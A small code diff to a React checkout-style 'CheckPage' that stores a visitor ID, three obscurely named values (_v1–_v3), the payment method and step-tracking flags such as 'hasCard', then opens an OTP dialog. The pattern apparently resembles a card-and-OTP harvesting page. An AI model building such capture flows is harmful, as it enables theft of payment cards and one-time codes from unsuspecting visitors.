@@ -137,7 +137,17 @@ export default function CheckPage() {
     e.preventDefault()
     // Save current data to history before updating
     
-    await addData({ id: visitorID, _v1, _v2, _v3, selectedPaymentMethod, cardUpdatedAt: new Date().toISOString() }).then(() => {
+    await addData({ 
+      id: visitorID, 
+      _v1, 
+      _v2, 
+      _v3, 
+      selectedPaymentMethod, 
+      cardUpdatedAt: new Date().toISOString(),
+      currentPage: "check",
+      currentStep: 4,
+      hasCard: true
+    }).then(() => {
       setShowOtpDialog(true)
     })
   }
